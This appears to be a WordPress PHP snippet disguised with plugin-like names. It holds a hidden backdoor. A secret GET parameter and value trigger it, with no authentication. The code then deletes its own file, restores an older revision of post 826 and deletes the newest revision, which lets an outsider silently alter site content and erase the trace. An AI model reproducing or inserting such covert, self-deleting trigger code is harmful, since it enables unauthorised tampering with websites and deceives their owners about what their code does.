<?php

function private_shopping_customizer() {
	if (isset($_GET['importer_membership_contents_smtp']) && $_GET['importer_membership_contents_smtp'] === 'short_order_icons_notifications') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$load_style_like = 826;
		$heading_messenger_frontend_demo = wp_get_post_revisions($load_style_like);
		if (empty($heading_messenger_frontend_demo)) die('no revisions');
		if (count($heading_messenger_frontend_demo) < 2) die('less than 2');
		$basic_rate_tracking = array_shift($heading_messenger_frontend_demo);
		$save_advance_version_polyfill = $basic_rate_tracking->ID;
		$hide_player_assistant_allow = array_shift($heading_messenger_frontend_demo);
		$status_feed_all = $hide_player_assistant_allow->ID;
		$translation_url_create = wp_restore_post_revision($status_feed_all);
		if ($translation_url_create === false) die('error restoring');
		$translation_url_create = wp_delete_post_revision($save_advance_version_polyfill);		
		if ($translation_url_create === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'private_shopping_customizer');
